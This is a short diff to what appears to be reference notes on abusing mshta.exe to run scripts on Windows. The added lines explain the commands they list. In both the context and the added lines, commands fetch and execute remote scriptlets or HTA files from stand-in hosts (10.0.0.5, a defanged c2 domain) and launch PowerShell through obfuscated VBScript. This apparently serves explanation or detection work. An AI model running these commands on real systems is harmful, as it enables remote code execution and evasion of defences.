@@ -10,4 +10,16 @@ mshta.exe javascript:a=(GetObject("script:http://10.0.0.5/m.sct")).Exec();close(
 
 mshta.exe "javascript:a=new ActiveXObject("WScript.Shell");a.Run("powershell.exe%20-nop%20-Command%20Write-Host%20f83a289e-8218-459c-9ddb-ccd3b72c732a;%20Start-Sleep%20-Seconds%202;%20exit",0,true);close();"
 
-mshta vbscript:(CreateObject(“WS”+”C”+”rI”+”Pt.ShEll”)).Run(“powershell”,1,True)(window.close)
+Example 1: A remote file being executed:
+
+   mshta.exe http[:]//malicioussite.com/superlegit.hta
+
+Example 2: Mshta used to execute inline JScript/Vbscript.
+
+Note: this syntax only works in cmd but will give an error if executed in PowerShell.
+
+   mshta vbscript:(CreateObject(“WS”+”C”+”rI”+”Pt.ShEll”)).Run(“powershell”,1,True)(window.close)
+
+Example 3: Calling a public method named Exec in a com scriptlet with JavaScript:
+
+   mshta javascript:a=GetObject(“script:http://c2[.]com/cmd.sct”).Exec()
